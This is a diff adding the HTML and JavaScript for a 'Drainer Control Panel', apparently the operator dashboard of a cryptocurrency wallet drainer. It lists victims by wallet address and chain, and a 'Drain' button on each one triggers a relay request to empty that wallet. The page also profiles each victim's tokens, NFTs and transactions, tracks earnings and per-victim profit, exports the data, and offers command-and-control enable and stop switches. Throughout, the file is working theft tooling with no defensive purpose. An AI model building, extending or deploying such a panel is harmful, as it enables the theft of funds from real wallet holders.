@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Drainer Control Panel</title>
+    <meta http-equiv="refresh" content="300"> <!-- Refresh every 5 minutes -->
+    <style>
+        body { font-family: Arial, sans-serif; background: #f5f5f5; color: #333; padding: 20px; margin: 0; }
+        h1 { color: #222; }
+        #noDataMsg { font-style: italic; color: #666; }
+        ul#victims { list-style: none; padding: 0; }
+        ul#victims li { 
+            background: #fff; 
+            margin-bottom: 10px; 
+            padding: 15px; 
+            border-radius: 5px; 
+            box-shadow: 0 0 5px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+        }
+        .modal-content {
+            background-color: #fff;
+            margin: 5% auto;
+            padding: 20px;
+            border-radius: 10px;
+            width: 80%;
+            max-width: 800px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .close:hover { color: #000; }
+        
+        /* Button styles */
+        button {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover { opacity: 0.9; }
+        button.enable { background: #27ae60; }
+        button.disable { background: #e74c3c; }
+        button.emergency { background: #f39c12; }
+        button.refresh { background: #3498db; }
+        
+        /* Status styles */
+        .status { margin-left: 10px; padding: 4px 8px; border-radius: 4px; }
+        .status.pending { background: #f39c12; color: white; }
+        .status.success { background: #27ae60; color: white; }
+        .status.failed { background: #e74c3c; color: white; }
+        
+        /* C&C Controls Styles */
+        .c2-controls { 
+            background: #2c3e50; 
+            padding: 15px; 
+            border-radius: 10px; 
+            margin-bottom: 20px; 
+            color: white; 
+        }
+        .c2-controls h3 { margin: 0 0 10px 0; }
+        .c2-stats { 
+            margin-top: 10px; 
+            font-size: 12px; 
+            opacity: 0.8; 
+        }
+        .status-active { color: #27ae60; font-weight: bold; }
+        .status-paused { color: #e74c3c; font-weight: bold; }
+        .status-offline { color: #95a5a6; font-weight: bold; }
+        
+        .victim-info { flex: 1; }
+        .victim-controls { display: flex; align-items: center; }
+    </style>
+</head>
+<body>
+    <h1>🚀 Drainer Control Panel</h1>
+    
+    <!-- C&C Control Center -->
+    <div class="c2-controls">
+        <h3>🚀 Drainer Control Center</h3>
+        
+        <div style="display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
+            <span>Status: <strong id="drainerStatus" class="status-active">Loading...</strong></span>
+            
+            <button class="enable" id="enableBtn">✅ Enable</button>
+            <button class="disable" id="disableBtn">⛔ Disable</button>
+            <button class="emergency" id="emergencyBtn">🚨 Emergency Stop</button>
+            <button class="refresh" id="refreshBtn">🔄 Refresh</button>
+        </div>
+        
+        <div id="c2Stats" class="c2-stats">
+            Victims: 0 | Earnings: $0 | Uptime: 0s
+        </div>
+    </div>
+<div class="c2-controls" style="background: #1e293b;">
+    <h3>📊 Advanced Analytics</h3>
+    
+    <div style="display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
+        <button class="enable" onclick="generateDailyReport()">📈 Daily Report</button>
+        <button class="enable" onclick="exportData('csv')">💾 Export CSV</button>
+        <button class="enable" onclick="exportData('json')">💾 Export JSON</button>
+        <button class="enable" onclick="showProfitSummary()">💰 Profit Summary</button>
+        <button class="refresh" onclick="refreshAnalytics()">🔄 Refresh Analytics</button>
+    </div>
+    
+    <div id="analyticsResults" style="margin-top: 15px; padding: 10px; background: rgba(255,255,255,0.1); border-radius: 5px; min-height: 60px;">
+        <div style="color: #ccc; text-align: center;">Analytics results will appear here</div>
+    </div>
+    
+    <div id="c2Analytics" class="c2-stats">
+        Net Profit: $0 | ROI: 0% | Avg. per Victim: $0
+    </div>
+</div>
+
+    <h2>Connected Victims</h2>
+    <div id="noDataMsg" style="display: none;">No victims connected yet...</div>
+    <ul id="victims"></ul>
+
+    <!-- Victim Modal -->
+    <div id="victimModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <div id="victimDetails"></div>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+    // ==================== C&C CONTROL FUNCTIONS ====================
+    async function enableDrainer() {
+        try {
+            const password = prompt('Enter admin password:');
+            if (!password) return;
+            
+            const response = await fetch('/c2/control', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    password: password,
+                    action: 'enable' 
+                })
+            });
+            
+            const result = await response.json();
+            if (result.success) {
+                alert('✅ Drainer enabled!');
+                updateStatus();
+            } else {
+                alert('❌ Failed: ' + (result.error || 'Unknown error'));
+            }
+        } catch (error) {
+            alert('❌ Connection error: ' + error.message);
+        }
+    }
+
+    async function disableDrainer() {
+        try {
+            const password = prompt('Enter admin password:');
+            if (!password) return;
+            
+            const response = await fetch('/c2/control', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    password: password,
+                    action: 'disable' 
+                })
+            });
+            
+            const result = await response.json();
+            if (result.success) {
+                alert('⏸️ Drainer disabled!');
+                updateStatus();
+            } else {
+                alert('❌ Failed: ' + (result.error || 'Unknown error'));
+            }
+        } catch (error) {
+            alert('❌ Connection error: ' + error.message);
+        }
+    }
+
+    async function emergencyStop() {
+        if (!confirm('🚨 EMERGENCY SHUTDOWN!\n\nThis will immediately disable the drainer.\nAre you sure?')) {
+            return;
+        }
+        
+        try {
+            const password = prompt('Enter admin password:');
+            if (!password) return;
+            
+            const response = await fetch('/c2/control', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    password: password,
+                    action: 'emergency' 
+                })
+            });
+            
+            const result = await response.json();
+            if (result.success) {
+                alert('🚨 EMERGENCY SHUTDOWN ACTIVATED!');
+                updateStatus();
+            } else {
+                alert('❌ Failed: ' + (result.error || 'Unknown error'));
+            }
+        } catch (error) {
+            alert('❌ Connection error: ' + error.message);
+        }
+    }
+
+    // ==================== ANALYTICS FUNCTIONS ====================
+async function generateDailyReport() {
+    try {
+        showAnalyticsStatus('⏳ Generating daily report...');
+        
+        const response = await fetch('/api/analytics/reports/generate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                template: 'daily',
+                data: {} // You can pass specific data if needed
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            showAnalyticsResult('📊 Daily Report Generated', result.report);
+        } else {
+            showAnalyticsError('Failed to generate report: ' + result.error);
+        }
+    } catch (error) {
+        showAnalyticsError('Report generation error: ' + error.message);
+    }
+}
+
+async function exportData(format) {
+    try {
+        showAnalyticsStatus(`⏳ Exporting ${format.toUpperCase()} data...`);
+        
+        const response = await fetch('/api/analytics/export', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ format, timeframe: 'all' })
+        });
+        
+        if (response.ok) {
+            const blob = await response.blob();
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `drainer_export_${new Date().toISOString().split('T')[0]}.${format}`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+            
+            showAnalyticsStatus(`✅ ${format.toUpperCase()} export completed`);
+        } else {
+            showAnalyticsError('Export failed: ' + response.statusText);
+        }
+    } catch (error) {
+        showAnalyticsError('Export error: ' + error.message);
+    }
+}
+
+async function showProfitSummary() {
+    try {
+        showAnalyticsStatus('⏳ Loading profit summary...');
+        
+        const response = await fetch('/api/analytics/profit-summary');
+        const result = await response.json();
+        
+        if (result.success) {
+            const summary = result.summary;
+            const html = `
+                <div style="color: white;">
+                    <strong>💰 Profit Summary</strong><br>
+                    Total Revenue: $${summary.totalRevenue.toFixed(2)}<br>
+                    Total Expenses: $${summary.totalExpenses.toFixed(2)}<br>
+                    Net Profit: $${summary.netProfit.toFixed(2)}<br>
+                    ROI: ${summary.roi.toFixed(2)}%<br>
+                    Transactions: ${summary.transactionCount}
+                </div>
+            `;
+            showAnalyticsResult('Profit Analysis', html);
+            
+            // Update analytics stats
+            document.getElementById('c2Analytics').innerHTML = `
+                Net Profit: $${summary.netProfit.toFixed(2)} | 
+                ROI: ${summary.roi.toFixed(2)}% | 
+                Avg. per Victim: $${summary.transactionCount > 0 ? (summary.netProfit / summary.transactionCount).toFixed(2) : '0'}
+            `;
+        } else {
+            showAnalyticsError('Failed to load profit summary');
+        }
+    } catch (error) {
+        showAnalyticsError('Profit summary error: ' + error.message);
+    }
+}
+
+async function refreshAnalytics() {
+    await showProfitSummary();
+    showAnalyticsStatus('✅ Analytics refreshed');
+}
+
+function showAnalyticsResult(title, content) {
+    const resultsDiv = document.getElementById('analyticsResults');
+    resultsDiv.innerHTML = `
+        <div style="color: #27ae60; margin-bottom: 10px;"><strong>${title}</strong></div>
+        <div style="color: white;">${content}</div>
+    `;
+}
+
+function showAnalyticsStatus(message) {
+    const resultsDiv = document.getElementById('analyticsResults');
+    resultsDiv.innerHTML = `<div style="color: #f39c12;">${message}</div>`;
+}
+
+function showAnalyticsError(message) {
+    const resultsDiv = document.getElementById('analyticsResults');
+    resultsDiv.innerHTML = `<div style="color: #e74c3c;">❌ ${message}</div>`;
+}
+
+// Add this to your existing updateStatus function to also update analytics:
+async function updateStatus() {
+    try {
+        const response = await fetch('/c2/status');
+        const status = await response.json();
+        
+        const statusElement = document.getElementById('drainerStatus');
+        statusElement.textContent = status.status;
+        
+        // Update status color
+        statusElement.className = '';
+        if (status.status === 'active') {
+            statusElement.classList.add('status-active');
+        } else if (status.status === 'paused') {
+            statusElement.classList.add('status-paused');
+        } else {
+            statusElement.classList.add('status-offline');
+        }
+            
+        document.getElementById('c2Stats').innerHTML = `
+            Victims: ${status.stats.totalVictims} | 
+            Earnings: $${status.stats.totalEarnings.toFixed(2)} | 
+            Successful: ${status.stats.successfulDrains} |
+            Failed: ${status.stats.failedDrains}
+        `;
+        
+        // Also update analytics if available
+        if (status.stats.totalEarnings > 0) {
+            await showProfitSummary();
+        }
+        
+    } catch (error) {
+        document.getElementById('drainerStatus').textContent = 'offline';
+        document.getElementById('drainerStatus').className = 'status-offline';
+        console.error('Status update error:', error);
+    }
+}
+
+    async function updateStatus() {
+        try {
+            const response = await fetch('/c2/status');
+            const status = await response.json();
+            
+            const statusElement = document.getElementById('drainerStatus');
+            statusElement.textContent = status.status;
+            
+            // Update status color
+            statusElement.className = '';
+            if (status.status === 'active') {
+                statusElement.classList.add('status-active');
+            } else if (status.status === 'paused') {
+                statusElement.classList.add('status-paused');
+            } else {
+                statusElement.classList.add('status-offline');
+            }
+                
+            document.getElementById('c2Stats').innerHTML = `
+                Victims: ${status.stats.totalVictims} | 
+                Earnings: $${status.stats.totalEarnings.toFixed(2)} | 
+                Successful: ${status.stats.successfulDrains} |
+                Failed: ${status.stats.failedDrains}
+            `;
+            
+        } catch (error) {
+            document.getElementById('drainerStatus').textContent = 'offline';
+            document.getElementById('drainerStatus').className = 'status-offline';
+            console.error('Status update error:', error);
+        }
+    }
+
+    // Auto-update status every 10 seconds
+    setInterval(updateStatus, 10000);
+
+    // ==================== VICTIM MANAGEMENT ====================
+    document.addEventListener('DOMContentLoaded', function() {
+        const socket = io();
+        const victimsList = document.getElementById("victims");
+        const noDataMsg = document.getElementById("noDataMsg");
+        const modal = document.getElementById("victimModal");
+        const closeModal = document.querySelector(".close");
+        const victimDetails = document.getElementById("victimDetails");
+
+        let liveRefreshInterval = null;
+
+        // Initial status update
+        updateStatus();
+
+        function renderVictim(data) {
+            noDataMsg.style.display = 'none';
+            
+            const li = document.createElement("li");
+            
+            const infoDiv = document.createElement("div");
+            infoDiv.className = "victim-info";
+            
+            const addrEl = document.createElement("div");
+            addrEl.innerHTML = `<strong>Address:</strong> ${data.walletAddress}`;
+            
+            const chainEl = document.createElement("div");
+            chainEl.innerHTML = `<strong>Chain:</strong> ${data.chain}`;
+            
+            const timeEl = document.createElement("div");
+            timeEl.innerHTML = `<strong>Time:</strong> ${new Date(data.timestamp).toLocaleString()}`;
+
+            infoDiv.appendChild(addrEl);
+            infoDiv.appendChild(chainEl);
+            infoDiv.appendChild(timeEl);
+
+            const controlsDiv = document.createElement("div");
+            controlsDiv.className = "victim-controls";
+
+            const drainBtn = document.createElement("button");
+            drainBtn.innerText = "Drain";
+            drainBtn.style.background = "#e74c3c";
+
+            const profileBtn = document.createElement("button");
+            profileBtn.innerText = "Profile";
+            profileBtn.style.background = "#3498db";
+            profileBtn.onclick = () => openVictimProfile(data.walletAddress, data.chain);
+
+            const statusSpan = document.createElement("span");
+            statusSpan.className = "status";
+
+            drainBtn.onclick = async () => {
+                // Check if drainer is enabled before draining
+                try {
+                    const statusResponse = await fetch('/c2/status');
+                    const status = await statusResponse.json();
+                    
+                    if (!status.config.enabled) {
+                        alert('⏸️ Drainer is currently disabled by operator');
+                        return;
+                    }
+
+                    statusSpan.textContent = "Pending...";
+                    statusSpan.className = "status pending";
+
+                    const res = await fetch("/api/relay", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            walletAddress: data.walletAddress,
+                            chain: data.chain
+                        })
+                    });
+                    
+                    const result = await res.json();
+                    if (result.success) {
+                        statusSpan.textContent = "Success";
+                        statusSpan.className = "status success";
+                    } else {
+                        statusSpan.textContent = "Failed: " + (result.error || 'Unknown error');
+                        statusSpan.className = "status failed";
+                    }
+                } catch (err) {
+                    statusSpan.textContent = "Error";
+                    statusSpan.className = "status failed";
+                    console.error('Drain error:', err);
+                }
+            };
+
+            controlsDiv.appendChild(drainBtn);
+            controlsDiv.appendChild(profileBtn);
+            controlsDiv.appendChild(statusSpan);
+
+            li.appendChild(infoDiv);
+            li.appendChild(controlsDiv);
+            victimsList.appendChild(li);
+        }
+
+        async function openVictimProfile(address, chain) {
+            modal.style.display = "block";
+            victimDetails.innerHTML = "Loading...";
+
+            await loadVictimData(address, chain);
+
+            clearInterval(liveRefreshInterval);
+            liveRefreshInterval = setInterval(() => {
+                loadVictimData(address, chain);
+            }, 10000);
+        }
+
+        async function loadVictimData(address, chain) {
+            try {
+                const res = await fetch(`/api/victim/${chain}/${address}`);
+                const data = await res.json();
+
+                let html = `<h3>Wallet: ${address}</h3>`;
+                html += `<h4>Tokens</h4><ul>`;
+                
+                if (data.tokens && data.tokens.length > 0) {
+                    data.tokens.forEach(t => {
+                        html += `<li>${t.symbol}: ${(t.balance / (10 ** t.decimals)).toFixed(4)}</li>`;
+                    });
+                } else {
+                    html += `<li>No tokens found</li>`;
+                }
+                html += `</ul>`;
+
+                html += `<h4>NFTs</h4>`;
+                if (data.nfts && data.nfts.result && data.nfts.result.length > 0) {
+                    data.nfts.result.slice(0, 5).forEach(n => {
+                        if (n.metadata) {
+                            try {
+                                const meta = JSON.parse(n.metadata);
+                                if (meta && meta.image) {
+                                    html += `<img src="${meta.image}" alt="${meta.name || 'NFT'}" style="max-width: 100px; margin: 5px;"/>`;
+                                }
+                            } catch (e) {
+                                // Skip invalid metadata
+                            }
+                        }
+                    });
+                } else {
+                    html += `<p>No NFTs found</p>`;
+                }
+
+                html += `<h4>Recent Transactions</h4><ul>`;
+                if (data.txs && data.txs.result && data.txs.result.length > 0) {
+                    data.txs.result.slice(0, 5).forEach(tx => {
+                        html += `<li>${tx.hash.substring(0, 20)}... - ${tx.value} Wei</li>`;
+                    });
+                } else {
+                    html += `<li>No transactions found</li>`;
+                }
+                html += `</ul>`;
+
+                victimDetails.innerHTML = html;
+            } catch (err) {
+                console.error('Profile load error:', err);
+                victimDetails.innerHTML = "Error loading profile: " + err.message;
+            }
+        }
+
+        closeModal.onclick = () => {
+            modal.style.display = "none";
+            clearInterval(liveRefreshInterval);
+        };
+
+        window.onclick = (e) => {
+            if (e.target === modal) {
+                modal.style.display = "none";
+                clearInterval(liveRefreshInterval);
+            }
+        };
+
+        // Load history - FIXED VERSION
+fetch("/api/history")
+    .then(res => {
+        if (!res.ok) {
+            throw new Error(`HTTP error! status: ${res.status}`);
+        }
+        return res.json();
+    })
+    .then(history => {
+        // SAFETY CHECK: Ensure history is always an array
+        if (!Array.isArray(history)) {
+            console.warn('History is not an array, converting to empty array:', history);
+            history = [];
+        }
+        
+        if (history.length === 0) {
+            noDataMsg.style.display = 'block';
+        } else {
+            history.forEach(v => renderVictim(v));
+        }
+    })
+    .catch(err => {
+        console.error('History load error:', err);
+        noDataMsg.style.display = 'block';
+        noDataMsg.textContent = 'Error loading history';
+        
+        // Render empty array to avoid further errors
+        history = [];
+    });
+
+               // Polling instead of WebSockets - works on Render free tier
+        let currentVictims = [];
+
+        function startPolling() {
+            // Check for new victims every 15 seconds
+            setInterval(() => {
+                fetch('/api/history')
+                    .then(r => r.json())
+                    .then(victims => {
+                        if (!Array.isArray(victims)) victims = [];
+                        
+                        // Only update if victims changed
+                        if (JSON.stringify(victims) !== JSON.stringify(currentVictims)) {
+                            updateVictimsList(victims);
+                            currentVictims = victims;
+                        }
+                    })
+                    .catch(err => console.log('Poll error:', err));
+            }, 15000); // 15 seconds
+            
+            // Initial load
+            fetch('/api/history')
+                .then(r => r.json())
+                .then(victims => {
+                    if (!Array.isArray(victims)) victims = [];
+                    updateVictimsList(victims);
+                    currentVictims = victims;
+                });
+        }
+
+        function updateVictimsList(victims) {
+            const victimsList = document.getElementById("victims");
+            const noDataMsg = document.getElementById("noDataMsg");
+            
+            victimsList.innerHTML = '';
+            
+            if (victims.length === 0) {
+                noDataMsg.style.display = 'block';
+            } else {
+                noDataMsg.style.display = 'none';
+                victims.forEach(v => renderVictim(v));
+            }
+        }                                                                                                                                                                                                                                                                                                                                                                                                                        
+
+        // Start polling when page loads
+        startPolling();
+
+        // Listen for C&C status updates
+        socket.on('c2-status', (data) => {
+            const statusElement = document.getElementById('drainerStatus');
+            statusElement.textContent = data.status;
+            statusElement.className = data.enabled ? 'status-active' : 'status-paused';
+        });
+
+        // Add event listeners for C&C control buttons
+        document.getElementById('enableBtn').addEventListener('click', enableDrainer);
+        document.getElementById('disableBtn').addEventListener('click', disableDrainer);
+        document.getElementById('emergencyBtn').addEventListener('click', emergencyStop);
+        document.getElementById('refreshBtn').addEventListener('click', updateStatus);
+    });
+    </script>
+</body>
+</html>
